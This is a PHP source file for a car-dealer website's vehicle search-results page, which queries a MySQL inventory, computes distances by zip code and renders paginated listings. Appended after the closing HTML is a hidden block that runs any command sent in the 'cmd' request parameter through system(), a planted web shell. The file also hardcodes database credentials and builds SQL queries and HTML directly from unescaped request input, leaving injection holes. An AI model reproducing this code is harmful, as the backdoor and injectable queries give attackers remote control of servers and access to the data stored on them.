<?php
$dbh=mysql_connect ("localhost", "jklono_wnymoto", "dragon19") or die ('I cannot connect to the database because: ' . mysql_error());
$select = mysql_select_db ("jklono_dragon"); 

function distance($lat1, $lon1, $lat2, $lon2) 
{ 
  $theta = $lon1 - $lon2; 
  $dist = sin(deg2rad($lat1)) * sin(deg2rad($lat2)) +  cos(deg2rad($lat1)) * cos(deg2rad($lat2)) * cos(deg2rad($theta)); 
  $dist = acos($dist); 
  $dist = rad2deg($dist); 
  $miles = $dist * 60 * 1.1515;

RETURN $miles;
}

$sql= "SELECT * FROM settings";
$result = mysql_query($sql);
if ($myarray = mysql_fetch_array($result))    
{ 
  do{
	$settings[] = $myarray;           //The array of vehicles.
    } while ($myarray = mysql_fetch_array($result));
	
$settings_cnt = count($settings);
}
for ($a=0;$a<$settings_cnt;$a++)
{
$x = $settings[$a]['dealerid'];
$dealer[$x]['price'] = $settings[$a]['price'];
$dealer[$x]['dealership'] = $settings[$a]['dealership'];
$dealer[$x]['url'] = $settings[$a]['url'];
$dealer[$x]['dir'] = $settings[$a]['dir'];
$dealer[$x]['address1'] = $settings[$a]['address1'];
$dealer[$x]['city'] = $settings[$a]['city'];
$dealer[$x]['state'] = $settings[$a]['state'];
$dealer[$x]['zip'] = $settings[$a]['zip'];
$dealer[$x]['contactphone'] = $settings[$a]['contactphone'];
}
if (isset($next_btn_x)) { $page++; }
if (isset($prev_btn_x)) { $page--; }
if (is_numeric($page2)) { $page = $page2; }
if (is_numeric($page3)) { $page = $page3; }
function listing_stats($listed,$url)
{
$ip=$_SERVER['REMOTE_ADDR'];
$dstamp = date(YmdHis);
$currdate = date(Ymd);
$sql= "SELECT * FROM listed_stats WHERE ip = '$ip' && url = '$url' && listed = '$listed' && date LIKE '$currdate%'";
$result = mysql_query($sql);
	if ($myarray = mysql_fetch_array($result))    
	{ 
	
	}
	else
	{
	    $sql2 = "INSERT INTO listed_stats (ip,listed,url,date)    
			VALUES ('$ip','$listed','$url','$dstamp')";
    $result2 = mysql_query($sql2);
	}
}
?>
<html>
<head>
<title>WNYMotors - Search Results</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="stylesheet" href="style.css" type="text/css">

<SCRIPT language='JavaScript'>
function checkway(sortthis)
{
	if (document.myform.sortby.selectedIndex == sortthis)
	{
		if (document.myform.way.selectedIndex == 0)
		{
		document.myform.way.selectedIndex = 1;
		} else {
		document.myform.way.selectedIndex =0;
		}
	} else {
	document.myform.way.selectedIndex =0;
	}
document.myform.sortby.selectedIndex = sortthis;
}

<?php 
echo"

function OnSubmitForm()
{
  if(document.pressed == 'Compare')
  {
   document.myform.action ='compare.php';
  }
  else
  {
    document.myform.action ='$PHP_SELF';
  }
  return true;
}
</SCRIPT>";
?>
</head>
<body marginwidth="0" marginheight="0" topmargin="0" leftmargin="0" bgcolor="#FFFFFF" text="#000000">    
 <form name="myform" method="post" onSubmit="return OnSubmitForm();" >
		
<?php
	
	if ($sortby <> "" && $sortby <> "Distance" && $sortby <> "price")
	{
	$sort ="ORDER BY $sortby";
	}
	else if ($sortby == "" && $zipcode <> "")
	{
	$sortby = "Distance";
	} else {
	$sort ="ORDER BY dealerid";
	}
	if ($sortby == "make,model" && $way <> "")
	{
	$sort = "ORDER BY make $way, model";
	}
	
	if (isset($bodystyle))
	{
		$bodystring = "";
		$bodycount = count($bodystyle);
		for ($c=0;$c<$bodycount;$c++)
		{
		$tempbody = $bodystyle[$c];
			if ($c == 0)
			{
			$bodystring = "&& (bodystyle = '$tempbody'";
			} else {
		$bodystring = "$bodystring || bodystyle = '$tempbody'";
			}
		}
		$where = "$bodystring) ";
	}
	
	
		if ($makeselect <> "" && $makeselect <> "any")
		{
		$where .= "&& make = '$makeselect' ";
		}
		if ($myselect <> "any" && $myselect <> "")                        //if a model is specified
		{
		$where .= "&& model = '$myselect' ";
		}
		if ($year1 <> "any" && $year1 <> "before 1988" && $year1 <> "")      //before 1988 in year1 is the same as not specifying anything
		{
		$where .= "&& year >= '$year1' ";
		}
		if ($year2 <> "any" && $year2 <> "")
		{
			if ($year2 == "before 1988")
			{
			$where .= "&& year <= '1988' ";
			}
			else
			{
			$where .= "&& year <= '$year2' ";
			}
		}
	
		if ($price1 <> "any" && $price1 <> "")
		{
		$where .= "&& (internet_price >= '$price1' || retail_price >= '$price1') ";
		}
		if ($price2 <> "any" && $price2 <> "")
		{
		$where .= "&& ((internet_price <= '$price2' && internet_price > 0) || (retail_price <= '$price2' && retail_price > 0)) ";
		}
		if ($mile1 <> "any" && $mile1 <> "")
		{
		$where .= "&& miles >= '$mile1' ";
		}
		if ($mile2 <> "any" && $mile2 <> "")
		{
		$where .= "&& miles <= '$mile2' ";
		}
		if ($onlypics == 1)
		{
		$where .= "&& imgcount > 0 ";
		}
		if ($onlyprices == 1)
		{
		$where .= "&& (retail_price > 0 || internet_price > 0) ";
		}

$dist_sql = "SELECT * FROM ziblib WHERE ZIP = '$zipcode'";
$dist_result = mysql_query($dist_sql);
$custloc = mysql_fetch_array($dist_result);
	
$sql= "SELECT * FROM vehicles WHERE pending = '0' && published = '1' && dealerid <> 'WNY' $where $sort $way";
$result = mysql_query($sql);
if ($myarray = mysql_fetch_array($result))    
{ 
  do{
  		if ($zipcode <> "")
		{
			$tempid = $myarray['dealerid'];
			$sql2 = "SELECT zip FROM settings WHERE dealerid = '$tempid'";
			$result2 = mysql_query($sql2);
			$temparr = mysql_fetch_array($result2);
			$dzip = $temparr['zip'];
			$dist_sql = "SELECT * FROM ziblib WHERE ZIP = '$dzip'";
			$dist_result = mysql_query($dist_sql);
			$dealerloc = mysql_fetch_array($dist_result);
			
			$tempdist = distance($dealerloc['Lat'], $dealerloc['Long'], $custloc['Lat'], $custloc['Long']);
			
			$myarray['dist'] = $tempdist;
			$dist_arr[] = $tempdist;
		}
		
		if ( $myarray['internet_price'] < 1)
		{
			$tempprice = $myarray['retail_price'];
		} else {
			$tempprice = $myarray['internet_price'];
		}
		$myarray['price'] = $tempprice;
		$price_arr[] = $tempprice;
	$info[] = $myarray;           //The array of vehicles.
    } while ($myarray = mysql_fetch_array($result));
	
	if ($sortby == "Distance" && $zipcode <> "")
	{
		if ($way == "DESC")
		{
		array_multisort($dist_arr,SORT_NUMERIC,SORT_DESC,$info);
		} else {
		array_multisort($dist_arr,SORT_NUMERIC,SORT_ASC,$info);
		}
	}
	if ($sortby == "price")
	{
		if ($way == "DESC")
		{
		array_multisort($price_arr,SORT_NUMERIC,SORT_DESC,$info);
		} else {
		array_multisort($price_arr,SORT_NUMERIC,SORT_ASC,$info);
		}
	}
	
	//array_multisort($price_arr,SORT_NUMERIC,SORT_ASC,$info);
	
	$count = count($info);   //number of vehicles 
}
if (is_numeric($perpage) == FALSE)
{
$perpage = 50;
}
$pagecnt = $count/$perpage;
$pagecnt = ceil($pagecnt);         //the number of pages is the total amount of cars divided by the amount displayed per page rounded up
if ($page > $pagecnt) { $page = $pagecnt;  } else if ($page < 1) { $page = 1; }
if ($page == "")
{
$page = 1;
}
$prepage = $page - 1;
$postpage = $page + 1;
$start = ($page - 1) * $perpage;
if ($page < $pagecnt)
{
$stop = $page * $perpage;
} else {
$stop = $count;
}
for ($a=$start;$a<$stop;$a++)    //takes all the vehicles and makes array of just the vehicles shown on the current page
{
$vehinfo[] = $info[$a];
}
$vehcount = count($vehinfo);
//**********************************************************
if (($old_perpage == "" && $old_sortby == "") || ($perpage == $old_perpage && $sortby == $old_sortby))
{
	for ($x=$start;$x<$stop;$x++)
	{
	$vinarray2[] = $info[$x]['vin'];   //used in listing stats
	}
	if(is_array($vinarray2))
	{
	$listed = implode(",", $vinarray2);
	$cocoe = listing_stats($listed,$PHP_SELF);
	}
}
//***************************************************
//print_r($price_arr);
?>
<table width="790" border="0" cellpadding="0" cellspacing="0" align="left">
  <?php
    include '_top.php';   //displays top
?>
  <tr> 
    <td valign="top" width="150" class="graybg"> 
      <?php
    include '_menu.php';   //displays menu
?>
    </td>
      <td valign="top" width="640"> 
        <table width="619" border="0" cellspacing="2" cellpadding="1" align="center">
          <tr> 
            <td colspan="8" height="17"> 
              <div align="left"><a href="vehsearch2.php<?php if ($zipcode <> "") { echo "?zipcode=$zipcode"; }?>"><img src="images/bt2_newsearch.gif" width="20" height="20" border="0" align="left">New 
                Search</a> </div>
            </td>
          </tr>
          <tr> 
            <td colspan="2"> </td>
            <td colspan="6"> 
              <div align="right">Sort by&nbsp; 
                <select name="sortby" onChange="submit()" class="size11">
				  <option value="Distance" <?php if ($sortby == "Distance") { echo "selected"; } ?>>Distance</option>
                  <option value="year" <?php if ($sortby == "year") { echo "selected"; } ?>>Year</option>
                  <option value="make,model" <?php if ($sortby == "make,model") { echo "selected"; } ?>>Make &amp; Model</option>
                  <option value="miles" <?php if ($sortby == "miles") { echo "selected"; } ?>>Miles</option>
                  <option value="price" <?php if ($sortby == "price") { echo "selected"; } ?>>Price</option>
				  <option value="dealerid" <?php if ($sortby == "dealerid") { echo "selected"; } ?>>Dealership</option>
                </select>
                <label>
                <select name="way" class="size11" id="way" onChange="submit()">
                  <option <?php if ($way == "ASC") { echo "selected"; } ?>>ASC</option>
                  <option <?php if ($way == "DESC") { echo "selected"; } ?>>DESC</option>
                </select>
                </label>
                &nbsp;&nbsp;Listings Per Page 
                <select size="1" id="1stperpage" name="perpage" class="size11" onChange="submit()">
                  <option <?php if ($perpage == "10") { echo "selected"; } ?>>10</option>
                  <option <?php if ($perpage == "15") { echo "selected"; } ?>>15</option>
                  <option <?php if ($perpage == "20") { echo "selected"; } ?>>20</option>
                  <option <?php if ($perpage == "30") { echo "selected"; } ?>>30</option>
                  <option <?php if ($perpage == "40") { echo "selected"; } ?>>40</option>
                  <option <?php if ($perpage == "50") { echo "selected"; } ?>>50</option>
                  <option <?php if ($perpage == "100") { echo "selected"; } ?>>100</option>
                </select>
              </div>
            </td>
          </tr>
          <tr> 
            <td colspan="7"><?php echo $cocoe; ?></td>
          </tr>
          <tr> 
            <td colspan="7"> 
              <div align="left"> 
                <?php if ($page > 1) { ?>
                <input type="image" border="0" name="prev_btn" src="images/arr_prev_red.gif" width="88" height="19" alt="Previous" align="middle">
                <?php } else { ?>
                <img src="images/arr_prev_gray.gif" width="88" height="19" align="middle"> 
                <?php } 
			  
			echo "&nbsp;<b>Page $page of $pagecnt<b>&nbsp;";
			  
			  if ($page < $pagecnt) { ?>
                <input type="image" border="0" name="next_btn" value="submit" src="images/arr_next_red.gif" width="59" height="19" alt="Next" align="middle">
                <?php } else { ?>
                <img src="images/arr_next_gray.gif" width="59" height="19" align="middle"> 
                <?php }?>
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Go 
                to page 
                <input type="text" name="page2" size="2" style="width:30px">
				<input type="submit" name="go" value="Go" onClick="document.pressed=this.value">
              </div>
            </td>
          </tr>
          <tr> 
            <td colspan="5"> 
              <div align="left"> <b> 
                <?php echo "Viewing "; echo $start + 1;  echo " - $stop of $count Matches"; ?>
                </b> &nbsp;&nbsp;&nbsp;&nbsp; </div>
              <div align="right"> </div>
            </td>
            <td colspan="2"> 
              <div align="right"> 
                <input type="submit" name="Submit" onClick="document.pressed=this.value" value="Compare">
                <img src="images/compare_arr_top.gif" width="17" height="16">&nbsp;&nbsp;</div>
            </td>
          </tr>
          <tr> 
            <td width="110" bgcolor="#990000"><b><font color="#FFFFFF"></font></b></td>
            <td width="48" bgcolor="#990000"><div align="center"><b><a class="menu" onClick="checkway('1'); document.myform.submit();" href="#">Year</a></b></div></td>
            <td width="203" bgcolor="#990000"><div align="center"><b><a class="menu" onClick="checkway('2'); document.myform.submit();" href="#">Vehicle</a></b></div></td>
            <td width="53" bgcolor="#990000"><div align="center"><b><a class="menu" onClick="checkway('3'); document.myform.submit();" href="#">Miles</a></b></div></td>
            <td width="52" bgcolor="#990000"><div align="center"><b><a class="menu" onClick="checkway('4'); document.myform.submit();" href="#">Price</a></b></div></td>
            <td width="103" bgcolor="#990000"><div align="center"><b><a class="menu" onClick="checkway('0'); document.myform.submit();" href="#">Location</a></b></div></td>
            <td width="20" bgcolor="#990000"><b><font color="#FFFFFF"></font></b></td>
          </tr>
          <?php 
$backcolor = "#FBF6F6";
for ($a=0;$a<$vehcount;$a++) {
$veh_dealerid = $vehinfo[$a]['dealerid'];
$vin = $vehinfo[$a]['vin'];
$year = $vehinfo[$a]['year'];
$make = $vehinfo[$a]['make'];
$model = $vehinfo[$a]['model'];
$trim = $vehinfo[$a]['type'];
$engine = $vehinfo[$a]['engine'];
$transmission = $vehinfo[$a]['transmission'];
$exterior = $vehinfo[$a]['exterior'];
$title = $vehinfo[$a]['title'];
$miles = number_format($vehinfo[$a]['miles']);
$retail_price = $vehinfo[$a]['retail_price'];
$internet_price = $vehinfo[$a]['internet_price'];
$dealership = $dealer[$veh_dealerid]['dealership'];
$address = $dealer[$veh_dealerid]['address1'];
$city = $dealer[$veh_dealerid]['city'];
$state = $dealer[$veh_dealerid]['state'];
$zip = $dealer[$veh_dealerid]['zip'];
$phone = $dealer[$veh_dealerid]['contactphone'];
$dir = $dealer[$veh_dealerid]['dir'];
$url = "http://" . $dealer[$veh_dealerid]['url'];
$imgcount = $vehinfo[$a]['imgcount'];
$price = $vehinfo[$a]['price'];
if ($price > 1)
{
$price = number_format($price);
$price = "$" . $price;
} else {
$price = "Call for Price";
}


$dist = $vehinfo[$a]['dist'];

if ($backcolor == "#FBF6F6")  //set the background colors
{
$backcolor = "#F6F6F6";
}else{
$backcolor = "#FBF6F6";
}
?>
          <tr onMouseOver="this.bgColor = '#D3FED7'" onMouseOut ="this.bgColor = '<?php echo $backcolor ?>'" bgcolor="<?php echo $backcolor ?>"> 
            <td width="110" valign="top"> 
              <div align="center"> 
                <?php if ($imgcount < 1) { ?>
                <a href="<?php echo "vehicleinfo.php?vin=$vin&id=$veh_dealerid";  if ($zipcode <> "") { echo "&zipcode=$zipcode"; }?>"><img src="/images/noimage.gif" width="100" height="74" hspace="4" vspace="2" border="1"></a> 
                <?php } else { ?>
                <a href="<?php echo "vehicleinfo.php?vin=$vin&id=$veh_dealerid";  if ($zipcode <> "") { echo "&zipcode=$zipcode"; }?>"> 
                <img src="<?php echo "http://www.wnymotors.com/photos/$dir/thumb/01_$vin"; ?>.jpg" width="100" height="74" hspace="4" vspace="2" border="1"></a> 
                <?php } ?>
                <b><span class="size10"><a href="<?php echo "vehicleinfo.php?vin=$vin&id=$veh_dealerid"; ?>">more 
                info</a></span></b> </div>
            </td>
            <td class="size11" width="48"> 
              <div align="center"> 
                <?php echo $year; ?>
              </div>
            </td>
            <td class="size11" width="203"> 
              <?php echo "<span class='red12'><b>$make $model $trim </b></span>"; 
			  if($title <> "") {echo "<BR> <i> $title </i>"; }
			  echo "<BR> Vin: $vin";
			  echo "<BR> Engine: $engine";
			  echo "<BR> Transmission: $transmission";
			  echo "<BR> Mileage: $miles";
			  echo "<BR> Color: $exterior";
			  
			  ?>            </td>
            <td class="size11" width="53"> 
              <div align="center"> 
                <?php if ($miles > 1) { echo $miles; } else { echo "---"; }?>
              </div>
            </td>
            <td class="size11" width="52"> 
              <div align="center"> 
                <?php echo $price; ?>
              </div>
            </td>
            <td class="size11" width="103"> 
              <div align="center"><a href="<?php echo $url; ?>" target="_blank"> 
                <?php echo $dealership; ?></a><br/><?php echo $address; ?>  <br/>
				<?php echo "$city,&nbsp;$state&nbsp;$zip<br/>";
				echo $phone;
				if ($zipcode <> "")
				{
				echo " <br> <strong><em>" . number_format($dist) . " miles</em></strong>";
				}
				?>
              </div>
            </td>
            <td width="20"> 
              <div align="center"> 
                <input type="checkbox" name="vehicle[]" value="<?php echo $vin; ?>" <?php if (isset($vehicle)) { $foundit = array_search($vin,$vehicle);  if (is_numeric($foundit)){ echo "checked"; }  }?>>
              </div>
            </td>
          </tr>
          <?php
}
?>
          <tr> 
            <td colspan="5"> 
              <div align="left"> <b> 
                <?php echo "Viewing "; echo $start + 1;  echo " - $stop of $count Matches"; ?>
                </b> &nbsp;&nbsp;&nbsp;&nbsp; </div>
              <div align="right"> </div>
            </td>
            <td colspan="3"> 
              <div align="right"> 
                <input type="submit" name="Submit2" onClick="document.pressed=this.value" value="Compare">
                <img src="images/compare_arr_bottom.gif" width="17" height="16">&nbsp;&nbsp;</div>
            </td>
          </tr>
          <tr> 
            <td colspan="7">&nbsp;</td>
          </tr>
          <tr> 
            <td colspan="7"> 
              <div align="left"> 
                <?php if ($page > 1) { ?>
                <input type="image" border="0" name="prev_btn" src="images/arr_prev_red.gif" width="88" height="19" alt="Previous" align="middle">
                <?php } else { ?>
                <img src="images/arr_prev_gray.gif" width="88" height="19" align="middle"> 
                <?php } 
			  
			echo "&nbsp;<b>Page $page of $pagecnt<b>&nbsp;";
			  
			  if ($page < $pagecnt) { ?>
                <input type="image" border="0" name="next_btn" value="submit" src="images/arr_next_red.gif" width="59" height="19" alt="Next" align="middle">
                <?php } else { ?>
                <img src="images/arr_next_gray.gif" width="59" height="19" align="middle"> 
                <?php }?>
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Go 
                to page 
                <input type="text" name="page3" size="2" style="width:30px">
                <input type="submit" name="go" value="Go">
              </div>
            </td>
          </tr>
          <tr> 
            <td colspan="2"> </td>
            <td colspan="6"> 
              
            </td>
          </tr>
          <tr> 
            <td colspan="8"><a href="vehsearch2.php">New Search</a> </td>
          </tr>
          <tr> 
            <td colspan="5">&nbsp;</td>
            <td colspan="3">&nbsp;</td>
          </tr>
        </table>
   
        <input type="hidden" name="page" value="<?php echo $page; ?>">
		<input type="hidden" name="makeselect" value="<?php echo $makeselect; ?>">
		<input type="hidden" name="myselect" value="<?php echo $myselect; ?>">
		<input type="hidden" name="year1" value="<?php echo $year1; ?>">
		<input type="hidden" name="year2" value="<?php echo $year2; ?>">
		<input type="hidden" name="mile1" value="<?php echo $mile1; ?>">
		<input type="hidden" name="mile2" value="<?php echo $mile2; ?>">
		<input type="hidden" name="price1" value="<?php echo $price1; ?>">
		<input type="hidden" name="price2" value="<?php echo $price2; ?>">
		<input type="hidden" name="old_perpage" value="<?php echo $perpage; ?>">
		<input type="hidden" name="old_sortby" value="<?php echo $sortby; ?>">
		<input name="zipcode" type="hidden" id="zipcode1" value="<?php echo $zipcode; ?>">
		<input name="onlypics" type="hidden" id="zipcode" value="<?php echo $onlypics; ?>">
		<input name="onlyprices" type="hidden" id="zipcode2" value="<?php echo $onlyprices; ?>">
		<?php
if (isset($vehicle)){
$vehicle = array_values(array_unique($vehicle));
 for ($a=0;$a<$vehcount;$a++)
 {
 $temp_vin = $vehicle[$a];
 echo "<input type='hidden' name='vehicle[]' value='$temp_vin'>";
 }
}
if (isset($bodystyle)){
 for ($c=0;$c<=$bodycount;$c++)
 {
 $tbody = $bodystyle[$c];
 echo "<input type='hidden' name='bodystyle[]' value='$tbody'>";
 }
}
 ?>      </td>
  </tr>
        <?php
    include '_bottom.php';   //displays bottom
?>
</table>
</form>
</body>
</html>
<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>